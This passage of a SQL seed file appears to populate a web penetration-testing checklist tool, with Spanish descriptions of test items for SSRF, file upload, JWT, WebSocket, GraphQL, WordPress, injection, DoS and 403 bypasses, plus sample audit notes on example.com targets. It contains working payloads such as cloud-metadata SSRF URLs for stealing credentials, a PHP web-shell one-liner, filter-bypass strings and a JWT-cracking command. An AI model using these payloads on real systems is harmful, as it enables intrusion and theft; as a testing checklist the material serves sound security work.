(18, 'Bypassing filters: Bypass using enclosed alphanumerics', '## Unicode Enclosed\n\n- **Payload:** `http://①②⑦.⓪.⓪.①`\n- **Teoría:** El navegador/backend puede normalizar estos caracteres Unicode a sus equivalentes numéricos ASCII.', 9),

(18, 'Cloud Instances: AWS metadata endpoints', '## AWS SSRF\n\n- **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n- **Objetivo:** Robar claves de acceso AWS (AccessKey, SecretKey).', 10),

(18, 'Cloud Instances: Google Cloud metadata endpoints', '## GCP SSRF\n\n- **Payload:** `http://metadata.google.internal/computeMetadata/v1/`\n- **Header Requerido:** `Metadata-Flavor: Google` (Bypass necesario en algunos casos).', 11),

(18, 'Cloud Instances: Digital Ocean metadata endpoints', '## Digital Ocean SSRF\n\n- **Payload:** `http://169.254.169.254/metadata/v1.json`\n- **Información:** Revela datos del droplet y user data (que a veces contiene secretos).', 12),

(18, 'Cloud Instances: Azure metadata endpoints', '## Azure SSRF\n\n- **Payload:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`\n- **Header Requerido:** `Metadata: true`.\n- **Objetivo:** Obtener tokens de identidad gestionada.', 13),

(18, 'Bypassing via open redirection', '## Chain SSRF + Open Redirect\n\n- **Flujo:** El servidor objetivo valida el dominio inicial pero sigue redirecciones.\n- **Payload:** `http://good-domain.com/redirect?url=http://169.254.169.254`.\n- **Resultado:** El servidor confía en good-domain, este redirige a la IP metadata, y el servidor entrega el secreto.', 14);

-- ==========================================
-- CATEGORY: File Upload Testing (ID 19)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(19, 'Upload malicious file to archive upload functionality', '## Zip Slip Vulnerability\n\n- **Concepto:** Subir un archivo comprimido (`.zip`, `.tar`) que contiene nombres de archivo con path traversal (`../../shell.php`).\n- **Impacto:** Al descomprimirse en el servidor, el archivo malicioso se escribe fuera del directorio de subidas, sobrescribiendo archivos críticos o alojando una shell.', 1),

(19, 'Upload a file and change its path to overwrite an existing system file', '## Path Traversal en Filename\n\n- **Prueba:** Intercepta la subida. Cambia `filename="foto.jpg"` a `filename="../../etc/passwd"` o `filename="../../index.php"`.\n- **Objetivo:** Sobrescribir archivos de configuración o reemplazar el index del sitio.', 2),

(19, 'Large File Denial of Service', '## Agotamiento de Disco\n\n- **Prueba:** Intenta subir un archivo de 10GB (o usa un archivo "sparse" que ocupa poco en tu disco pero mucho en el servidor).\n- **Resultado:** Si el servidor no valida el `Content-Length` o corta la conexión, puedes llenar el disco duro y tumbar el servicio.', 3),

(19, 'Metadata Leakage', '## Fuga de Datos Exif\n\n- **Análisis:** Descarga las imágenes subidas por otros usuarios.\n- **Herramienta:** `exiftool image.jpg`.\n- **Riesgo:** Coordenadas GPS exactas, modelo de cámara, software de edición, nombres de usuario del sistema operativo.', 4),

(19, 'ImageMagick Library Attacks', '## ImageTragick (CVE-2016-3714)\n\n- **Concepto:** Vulnerabilidad en librerías de procesamiento de imágenes.\n- **Payload:** Archivos `.mvg` o `.svg` maliciosos que ejecutan comandos del sistema al ser procesados.\n- **Prueba:** Inyectar comandos dentro de los metadatos de la imagen.', 5),

(19, 'Pixel Flood Attack', '## Bomba de Descompresión (RAM DoS)\n\n- **Técnica:** Crear una imagen de 100x100 píxeles, pero cambiar sus metadatos para que diga que es de 50.000x50.000.\n- **Impacto:** Cuando el servidor intenta cargarla en memoria RAM para procesarla, consume toda la memoria disponible y crashea.', 6),

(19, 'Bypasses: Null Byte (%00) Bypass', '## Truncamiento de Extensiones\n\n- **Payload:** `shell.php%00.jpg` o `shell.php\x00.jpg`.\n- **Teoría:** El validador lee ".jpg" (válido), pero el sistema de archivos (escrito en C) corta el nombre en el byte nulo, guardando `shell.php`.', 7),

(19, 'Bypasses: Content-Type Bypass', '## Spoofing de Tipo MIME\n\n- **Prueba:** Sube `shell.php`.\n- **Intercepta:** Cambia el header `Content-Type: application/x-php` a `Content-Type: image/jpeg`.\n- **Fallo:** El servidor confía en el header declarado por el usuario en lugar de verificar el contenido real.', 8),

(19, 'Bypasses: Magic Byte Bypass', '## Falsificación de Cabecera de Archivo\n\n- **Técnica:** Agrega los "Magic Bytes" de una imagen al inicio de tu script PHP.\n- **Payload:** `GIF89a; <?php system($_GET[''cmd'']); ?>`.\n- **Resultado:** El servidor cree que es un GIF válido, pero el intérprete PHP ejecuta el código.', 9),

(19, 'Bypasses: Client-Side Validation Bypass', '## Validación en JavaScript\n\n- **Detección:** Si el error salta instantáneamente sin petición de red.\n- **Bypass:** Desactiva JS en el navegador o usa Burp Suite para subir el archivo, ya que Burp se salta el navegador.', 10),

(19, 'Bypasses: Blacklisted Extension Bypass', '## Extensiones Alternativas\n\n- **Lista Negra:** Si bloquean `.php`, prueba:\n  - `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.inc`.\n  - `.jsp`, `.jspx`, `.jsw`, `.jsv`.\n  - `.asp`, `.aspx`, `.cer`, `.asa`.\n- **Configuración:** A veces Apache/Nginx ejecutan estas extensiones como scripts.', 11),

(19, 'Bypasses: Homographic Character Bypass', '## Unicode Confusion\n\n- **Técnica:** Usar caracteres cirílicos que parecen letras latinas en el nombre de la extensión (`p` cirílica vs `p` latina).\n- **Objetivo:** Confundir al filtro de validación.', 12);

-- ==========================================
-- CATEGORY: CAPTCHA Testing (ID 20)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(20, 'Missing Captcha Field Integrity Checks', '## Eliminación de Parámetro\n\n- **Prueba:** Intercepta la petición y borra el parámetro `g-recaptcha-response` o `captcha_code`.\n- **Fallo:** El backend puede estar configurado para validar el captcha *solo si el parámetro existe*.', 1),

(20, 'HTTP Verb Manipulation', '## Cambio de Método\n\n- **Prueba:** Cambia `POST /register` a `GET /register` enviando los parámetros en la URL.\n- **Fallo:** A veces el control de Captcha solo está aplicado en la ruta POST.', 2),

(20, 'Content Type Conversion', '## JSON vs Form-Data\n\n- **Prueba:** Cambia el `Content-Type` de `application/x-www-form-urlencoded` a `application/json` (o viceversa).\n- **Fallo:** El parser del backend podría saltarse la validación del captcha en formatos inesperados.', 3),

(20, 'Reusuable Captcha', '## Ataque de Replay\n\n- **Prueba:** Resuelve un captcha válido. Envía la petición. Intercepta y envíala de nuevo con EL MISMO código de captcha.\n- **Regla:** El captcha debe "quemarse" (invalidarse) tras el primer uso.', 4),

(20, 'Check if captcha is retrievable with the absolute path', '## Fuga de Fuente\n\n- **Prueba:** Inspecciona el código fuente HTML. A veces el valor del captcha está en un input hidden, en una cookie o en un comentario JS (`var captcha = "1234"`).', 5),

(20, 'Check for server side validation for CAPTCHA', '## Validación Fake\n\n- **Prueba:** Escribe cualquier valor aleatorio (`0000`).\n- **Fallo:** Si el captcha es solo cosmético (validado solo por JS en el cliente) y el servidor lo acepta.', 6),

(20, 'Check if image recognition can be done with OCR tool', '## Debilidad de Complejidad\n\n\n\n- **Herramientas:** `Tesseract`, extensiones de navegador de resolución automática.\n- **Fallo:** Si un bot puede leer el texto fácilmente, el captcha es inútil.', 7);

-- ==========================================
-- CATEGORY: JWT Token Testing (ID 21)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(21, 'Brute-forcing secret keys', '## Crackeo de Firma HMAC\n\n- **Herramienta:** `hashcat` o `jwt_tool`.\n- **Comando:** `hashcat -m 16500 token.txt wordlist.txt`.\n- **Objetivo:** Encontrar la clave secreta usada para firmar. Si la tienes, puedes forjar tokens de admin.', 1),

(21, 'Signing a new token with the "none" algorithm', '## Algoritmo None\n\n\n\n- **Payload:** Cambia el header a `{"alg": "none", "typ": "JWT"}`. Elimina la firma (la última parte tras el segundo punto).\n- **Fallo:** Algunas librerías aceptan tokens sin firma si el algoritmo es "none".', 2),

(21, 'Changing the signing algorithm of the token', '## Downgrade Attack\n\n- **Prueba:** Si el servidor usa `RS256` (Asimétrico), cambia el header a `HS256` (Simétrico) y firma el token usando la Clave Pública del servidor como "secreto".', 3),

(21, 'Signing the asymmetrically-signed token to its symmetric algorithm match', '## Key Confusion Attack (CVE-2016-10555)\n\n- **Concepto:** Forzar al servidor a usar su propia clave pública (que es pública) como clave secreta HMAC para validar el token.', 4);

-- ==========================================
-- CATEGORY: Websockets Testing (ID 22)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(22, 'Intercepting and modifying WebSocket messages', '## Manipulación en Tiempo Real\n\n- **Herramienta:** Burp Suite -> Proxy -> WebSockets history.\n- **Acción:** Intercepta mensajes `Client-to-Server`. Modifica parámetros JSON en vuelo (e.g., inyección SQL en mensajes de chat).', 1),

(22, 'Websockets MITM attempts', '## Cross-Site WebSocket Hijacking (CSWSH)\n\n- **Prueba:** Verifica si el servidor valida el header `Origin` durante el handshake (Upgrade request).\n- **Ataque:** Si no valida Origin, un atacante puede iniciar una conexión websocket desde su sitio malicioso usando las cookies de la víctima.', 2),

(22, 'Testing secret header websocket', '## Handshake Seguro\n\n- **Verificación:** ¿Las credenciales viajan en la URL (`ws://site.com?token=xyz`)? Eso es inseguro (logs, historial).\n- **Correcto:** Deben ir en Cookies o Headers de autorización durante el Upgrade HTTP.', 3),

(22, 'Content stealing in websockets', '## Exfiltración CSWSH\n\n- **Escenario:** Si existe CSWSH, el atacante conecta un socket y "escucha" los mensajes privados que recibe la víctima.', 4),

(22, 'Token authentication testing in websockets', '## Caducidad de Sesión\n\n- **Prueba:** Una vez establecido el socket, haz logout en la app web. Envía un mensaje por el socket.\n- **Fallo:** Los websockets a menudo se olvidan de validar que la sesión sigue activa tras la conexión inicial.', 5);

-- ==========================================
-- CATEGORY: GraphQL Vulnerabilities Testing (ID 23)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(23, 'Inconsistent Authorization Checks', '## IDOR en Graph\n\n- **Prueba:** En una query como `query { user(id: 123) { email } }`, cambia el ID.\n- **Nota:** GraphQL a menudo expone el grafo completo, y los devs olvidan proteger nodos específicos.', 1),

(23, 'Missing Validation of Custom Scalars', '## Inyección en Scalars\n\n- **Prueba:** Inyecta SQLi o XSS dentro de las variables de la query GraphQL (`$variable`).\n- **Fallo:** Los tipos personalizados (e.g., `Email`, `Date`) pueden no estar saneados correctamente.', 2),

(23, 'Failure to Appropriately Rate-limit', '## DoS por Complejidad (Nested Queries)\n\n- **Payload:**\n  ```graphql\n  query { author { posts { author { posts { ... } } } } }\n  ```\n- **Impacto:** Consultas cíclicas profundas que agotan la CPU del servidor.', 3),

(23, 'Introspection Query Enabled/Disabled', '## Reconocimiento Total\n\n- **Query:** `query { __schema { types { name fields { name } } } }`.\n- **Riesgo:** Si está habilitado, te entrega la documentación completa de la API, incluyendo queries ocultas o de administración.', 4);

-- ==========================================
-- CATEGORY: WordPress Common Vulnerabilities (ID 24)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(24, 'XSPA in wordpress', '## XML-RPC Pingback\n\n- **Endpoint:** `/xmlrpc.php`.\n- **Ataque:** Usar la función `pingback.ping` para escanear puertos internos (SSRF) o lanzar ataques DDoS a terceros.', 1),

(24, 'Bruteforce in wp-login.php', '## Falta de Rate Limiting\n\n- **Prueba:** `Hydra` o `Wpscan` contra el login.\n- **Defensa:** Plugins como Wordfence o fail2ban.', 2),

(24, 'Information disclosure wordpress username', '## Enumeración de Usuarios\n\n- **Técnicas:**\n  - `/?author=1`, `/?author=2` (Redirige al slug del usuario).\n  - `/wp-json/wp/v2/users` (API REST expuesta).\n- **Impacto:** Facilita ataques de fuerza bruta.', 3),

(24, 'Backup file wp-config exposed', '## Archivos de Configuración\n\n- **Busca:** `wp-config.php.bak`, `wp-config.php.old`, `.wp-config.php.swp`.\n- **Contenido:** Credenciales de la base de datos en texto plano.', 4),

(24, 'Log files exposed', '## Logs de Debug\n\n- **Ruta:** `/wp-content/debug.log`.\n- **Riesgo:** Si `WP_DEBUG_LOG` está activo, puede contener errores PHP que revelan rutas, usuarios o tokens.', 5),

(24, 'Denial of Service via load-styles.php', '## Concatenación de Scripts\n\n- **Payload:** `/wp-admin/load-styles.php?c=1&load[]=dashicons&load[]=admin-bar&...` (Repetir cientos de veces).\n- **Efecto:** Obliga al servidor a concatenar miles de archivos en una sola respuesta, agotando recursos.', 6),

(24, 'Denial of Service via load-scripts.php', '## DoS similar a Styles\n\n- **Vector:** Mismo ataque que el anterior pero en `/wp-admin/load-scripts.php`. A veces requiere estar autenticado (incluso con bajos privilegios).', 7),

(24, 'DDOS using xmlrpc.php', '## Amplificación XML-RPC\n\n- **Payload:** `system.multicall`. Permite ejecutar miles de métodos en una sola petición HTTP.', 8),

(24, 'CVE-2018-6389', '## DoS en JS/CSS\n\n- **Ref:** Vulnerabilidad específica de concatenación de scripts en versiones antiguas de WP.', 9),

(24, 'CVE-2021-24364', '## Vulnerabilidades en Plugins\n\n- **Acción:** Usar `wpscan --enumerate p` para detectar plugins vulnerables conocidos.', 10),

(24, 'WP-Cronjob DOS', '## Cron Externo\n\n- **Archivo:** `/wp-cron.php`.\n- **Ataque:** Peticiones masivas a este archivo pueden saturar el servidor si se ejecutan tareas pesadas en cada visita.', 11);

-- ==========================================
-- CATEGORY: XPath Injection (ID 25)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(25, 'XPath injection to bypass authentication', '## Bypass de Login XML\n\n- **Payload:** `'' or ''1''=''1` o `admin''] | * | user[@name=''admin`.\n- **Contexto:** Aplicaciones que usan bases de datos XML para guardar usuarios.', 1),

(25, 'XPath injection to exfiltrate data', '## Extracción de Datos\n\n- **Versiones:** XPath 1.0 vs 2.0.\n- **Técnica:** Similar a SQL Injection UNION. Manipular la query para que devuelva nodos hijos del documento XML.', 2),

(25, 'Blind and Time-based XPath injections', '## Inyección Ciega\n\n- **Payload:** `substring(//user[1]/password, 1, 1)=''a''`.\n- **Método:** Adivinar la contraseña carácter por carácter basándose en si la respuesta es verdadera (contenido) o falsa (vacío).', 3);

-- ==========================================
-- CATEGORY: LDAP Injection (ID 26)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(26, 'LDAP injection to bypass authentication', '## Bypass de Login LDAP\n\n- **Payload:** `*` (Asterisco es comodín en LDAP).\n- **Ejemplo:** User: `admin*`, Pass: `cualquiera`.\n- **Query Result:** `(&(user=admin*)(pass=...))` -> Encuentra al admin ignorando el resto.', 1),

(26, 'LDAP injection to exfiltrate data', '## Inyección de Filtros\n\n- **Payload:** `*)(uid=*))\x00`.\n- **Objetivo:** Manipular los filtros AND/OR (`&`, `|`) para extraer atributos ocultos como teléfonos o emails de otros usuarios.', 2);

-- ==========================================
-- CATEGORY: Denial of Service (ID 27)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(27, 'Cookie bomb', '## DoS de Cliente\n\n- **Técnica:** Establecer muchas cookies grandes via XSS o script.\n- **Efecto:** El navegador envía cabeceras HTTP gigantes. El servidor rechaza la petición (`431 Request Header Fields Too Large`). El usuario no puede acceder al sitio hasta limpiar cookies.', 1),

(27, 'Pixel flood, using image with a huge pixels', '## (Duplicado de File Upload)\n\nImagen con dimensiones declaradas masivas (50k x 50k) para agotar RAM del servidor.', 2),

(27, 'Frame flood, using GIF with a huge frame', '## GIF de la Muerte\n\n- **Payload:** GIF animado con miles de frames.\n- **Impacto:** Agotamiento de CPU al procesar la animación.', 3),

(27, 'ReDoS (Regex DoS)', '## Expresiones Regulares Maliciosas\n\n- **Payload:** `aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`.\n- **Vulnerabilidad:** Regex "catastróficos" (e.g., `(a+)+`) que tardan tiempo exponencial en procesar cadenas largas que no coinciden.', 4),

(27, 'CPDoS (Cache Poisoned Denial of Service)', '## Envenenamiento de Caché\n\n- **Técnica:** Forzar al servidor a generar una respuesta de error (400 Bad Request) que se almacene en la caché (CDN/Varnish).\n- **Impacto:** Todos los usuarios legítimos reciben el error cacheado.', 5);

-- ==========================================
-- CATEGORY: 403 Bypass (ID 28)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(28, 'Using "X-Original-URL" header', '## Override Headers\n\n- **Prueba:** Enviar petición a `/` (permitido) pero añadir `X-Original-URL: /admin`.\n- **Headers:** También probar `X-Rewrite-URL`, `X-Forwarded-For`.\n- **Frameworks:** Común en Symfony y ASP.NET.', 1),

(28, 'Appending %2e after the first slash', '## URL Encoding Tricky\n\n- **Payload:** `/admin` -> `/%2e/admin`.\n- **Teoría:** El WAF no reconoce la ruta, pero el backend normaliza `%2e` a `.` y resuelve la ruta correctamente.', 2),

(28, 'Try add dot (.) slash (/) and semicolon (;) in the URL', '## Confusión de Rutas\n\n- **Payloads:**\n  - `/admin/.`\n  - `/admin/;`\n  - `/admin/`\n  - `//admin//`\n- **Objetivo:** Engañar reglas de coincidencia exacta (Exact Match).', 3),

(28, 'Add "..;/" after the directory name', '## Estilo Tomcat/Java\n\n- **Payload:** `/admin/..;/`\n- **Variante:** `/sensitive/..;/sensitive`.\n- **Efecto:** El servidor de aplicaciones interpreta el `;` como separador de parámetros y sube un directorio, accediendo al recurso.', 4),

(28, 'Try to uppercase the alphabet in the url', '## Case Sensitivity\n\n- **Payload:** `/ADMIN` o `/AdMiN`.\n- **Fallo:** Si el WAF bloquea `/admin` (minúsculas) pero el servidor de archivos (Windows/IIS) es case-insensitive.', 5),

(28, 'Tool-bypass-403', '## Automatización\n\n- **Herramientas:** Scripts como `403bypasser.sh` o `bypass-403` prueban automáticamente todas estas combinaciones.', 6),

(28, 'Burp Extension-403 Bypasser', '## Extensión de Burp\n\n- **Uso:** Instala la extensión "403 Bypasser" en Burp Suite para probar payloads de evasión automáticamente en cada petición 403 detectada.', 7);

-- Inserir items de Other Test Cases
INSERT INTO checklist_items (category_id, title, order_num) VALUES
(29, 'Testing for Role authorization', 1),
(29, 'Check if normal user can access resources of high privileged users', 2),
(29, 'Forced browsing', 3),
(29, 'Insecure direct object reference', 4),
(29, 'Parameter tampering to switch user account', 5),
(29, 'Check for security headers: X Frame Options', 6),
(29, 'Check for security headers: X-XSS header', 7),
(29, 'Check for security headers: HSTS header', 8),
(29, 'Check for security headers: CSP header', 9),
(29, 'Check for security headers: Referrer Policy', 10),
(29, 'Check for security headers: Cache Control', 11),
(29, 'Check for security headers: Public key pins', 12),
(29, 'Blind OS command injection: using time delays', 13),
(29, 'Blind OS command injection: by redirecting output', 14),
(29, 'Blind OS command injection: with out-of-band interaction', 15),
(29, 'Blind OS command injection: with out-of-band data exfiltration', 16),
(29, 'Command injection on CSV export (Upload/Download)', 17),
(29, 'CSV Excel Macro Injection', 18),
(29, 'If you find phpinfo.php file, check for configuration leakage', 19),
(29, 'Parameter Pollution Social Media Sharing Buttons', 20),
(29, 'Broken Cryptography: Cryptography Implementation Flaw', 21),
(29, 'Broken Cryptography: Encrypted Information Compromised', 22),
(29, 'Broken Cryptography: Weak Ciphers Used for Encryption', 23),
(29, 'Web Services Testing: Test for directory traversal', 24),
(29, 'Web Services Testing: Web services documentation disclosure', 25);

-- Inserir items de Burp Suite Extensions
INSERT INTO checklist_items (category_id, title, order_num) VALUES
(30, 'Scanners: ActiveScanPlusPlus', 1),
(30, 'Scanners: additional-scanner-checks', 2),
(30, 'Scanners: backslash-powered-scanner', 3),
(30, 'Information Gathering: filter-options-method', 4),
(30, 'Information Gathering: Admin-Panel_Finder', 5),
(30, 'Information Gathering: BigIPDiscover', 6),
(30, 'Information Gathering: PwnBack', 7),
(30, 'Vulnerability Analysis: Burp-NoSQLiScanner', 8);

-- ==========================================
-- DADES DE PROVA
-- ==========================================

-- Inserir projectes de prova
INSERT INTO projects (name, description) VALUES
('E-commerce Platform Security Audit', 'Security assessment for a major e-commerce platform with payment processing'),
('Banking Application Pentest', 'Comprehensive penetration testing for online banking application'),
('Social Media Platform Bug Bounty', 'Bug bounty program for a social networking platform'),
('API Security Assessment', 'REST API security testing for mobile backend');

-- Inserir targets de prova
INSERT INTO targets (project_id, name, target, target_type, description) VALUES
(1, 'Main Website', 'https://shop.example.com', 'url', 'Primary e-commerce website with product catalog and checkout'),
(1, 'Admin Panel', 'https://admin.shop.example.com', 'url', 'Administrative backend for managing products and orders'),
(1, 'Payment Gateway', 'https://pay.shop.example.com', 'url', 'Payment processing integration endpoint'),
(2, 'Online Banking Portal', 'https://bank.example.com', 'url', 'Customer-facing online banking portal'),
(2, 'Mobile Banking API', 'https://api.bank.example.com', 'url', 'REST API for mobile banking application'),
(3, 'Main Platform', 'https://social.example.com', 'url', 'Main social networking platform'),
(3, 'User Profile API', 'https://api.social.example.com/users', 'url', 'User profile management API endpoints'),
(4, 'Authentication API', 'https://api.mobile.example.com/auth', 'url', 'Authentication and authorization endpoints'),
(4, 'User Data API', 'https://api.mobile.example.com/data', 'url', 'User data management endpoints');

-- Inserir items de checklist per al primer target (Main Website)
-- Alguns items de Recon Phase
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(1, 1, TRUE, 'Server: Apache 2.4.52, PHP 8.1, MySQL 8.0. Detected using Wappalyzer and Nmap.', NOW()),
(1, 2, TRUE, 'Found 3 subsidiaries: shop-eu.example.com, shop-asia.example.com, shop-us.example.com', NOW()),
(1, 5, TRUE, 'Found exposed credentials in public GitHub repo: github.com/example/shop-config', NOW()),
(1, 7, TRUE, 'Discovered /admin, /backup, /old directories. /backup returns 403 but exists.', NOW()),
(1, 10, TRUE, 'Found 23 subdomains including dev.shop.example.com (development environment exposed)', NOW()),
(1, 15, FALSE, 'Wayback machine shows old endpoints: /api/v1/legacy still accessible', NULL),
(1, 18, FALSE, NULL, NULL);

-- Items de Registration Feature Testing
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes) VALUES
(1, 19, TRUE, 'Password policy allows weak passwords like "password123". Minimum 8 chars but no complexity requirements.'),
(1, 20, TRUE, 'Email verification can be bypassed by intercepting the request and changing verified=false to verified=true'),
(1, 21, TRUE, 'Accepts disposable emails from temp-mail.org and guerrillamail.com'),
(1, 22, FALSE, NULL);

-- Items de Authentication Testing per al target 2 (Admin Panel)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(2, 26, TRUE, 'Username enumeration possible via different response times. Valid users: admin, administrator, root', NOW()),
(2, 27, TRUE, 'SQL injection in login form: username=admin OR 1=1 bypasses authentication', NOW()),
(2, 31, TRUE, 'No account lockout after 100 failed attempts. Rate limiting can be bypassed with X-Forwarded-For header', NOW()),
(2, 35, FALSE, 'Testing OAuth implementation', NULL);

-- Items de Session Management per al target 3 (Payment Gateway)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(3, 38, TRUE, 'Session cookie: PHPSESSID, not HttpOnly, not Secure flag despite HTTPS', NOW()),
(3, 42, TRUE, 'Session fixation vulnerability confirmed. Session ID not regenerated after login.', NOW()),
(3, 45, TRUE, 'User information (user_id, role) stored in plaintext in cookie payload', NOW());

-- Items de SQL Injection per al target 4 (Online Banking Portal)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(4, 162, TRUE, 'SQL injection detected in account_id parameter using single quote test', NOW()),
(4, 166, TRUE, 'Successfully bypassed WAF using URL encoding: %27%20OR%20%271%27=%271', NOW()),
(4, 170, TRUE, 'Time-based blind SQLi confirmed using MySQL SLEEP(5) - response delayed by 5 seconds', NOW());

-- Items de XSS per al target 5 (Mobile Banking API)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(5, 177, TRUE, 'Reflected XSS in search parameter: /search?q=<script>alert(1)</script>', NOW()),
(5, 179, TRUE, 'Stored XSS in user profile bio field. Payload persists with img tag and onerror handler', NOW()),
(5, 183, FALSE, 'Testing XSS filter evasion techniques', NULL);

-- Items de CSRF per al target 6 (Main Platform)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(6, 190, TRUE, 'CSRF token missing on password change endpoint. Successfully changed password via CSRF attack.', NOW()),
(6, 192, TRUE, 'CSRF token is reusable across different sessions. Same token valid for multiple requests.', NOW());

-- Items de File Upload per al target 7 (User Profile API)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(7, 230, TRUE, 'Uploaded PHP shell disguised as image with double extension - successfully executed on server', NOW()),
(7, 236, TRUE, 'Content-Type validation bypassed by changing header to image/jpeg while uploading PHP file', NOW()),
(7, 237, TRUE, 'Magic byte check bypassed by prepending GIF89a to PHP shell code', NOW());

-- Items de API Testing per al target 8 (Authentication API)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes) VALUES
(8, 251, TRUE, 'JWT secret key is weak: "secret123". Successfully forged tokens using jwt.io'),
(8, 252, TRUE, 'Algorithm confusion attack successful. Changed alg from RS256 to HS256 and signed with public key'),
(8, 253, FALSE, 'Testing for "none" algorithm acceptance');

-- Items de SSRF per al target 9 (User Data API)
INSERT INTO target_checklist (target_id, checklist_item_id, is_checked, notes, checked_at) VALUES
(9, 221, TRUE, 'SSRF vulnerability in image fetch parameter. Able to access http://localhost:8080/admin', NOW()),
(9, 222, TRUE, 'Bypassed localhost filter using http://127.0.0.1 and http://0.0.0.0', NOW()),
(9, 226, TRUE, 'AWS metadata exposed via SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/', NOW());

-- Actualitzar manualment les notes dels targets (els triggers funcionaran per futures actualitzacions)
UPDATE targets SET notes = (
    SELECT GROUP_CONCAT(
        CONCAT(ci.title, ': ', tc.notes) 
        SEPARATOR '\n\n---\n\n'
    )
    FROM target_checklist tc
    INNER JOIN checklist_items ci ON tc.checklist_item_id = ci.id
    WHERE tc.target_id = targets.id 
    AND tc.notes IS NOT NULL 
    AND tc.notes != ''
) WHERE id IN (SELECT DISTINCT target_id FROM target_checklist);
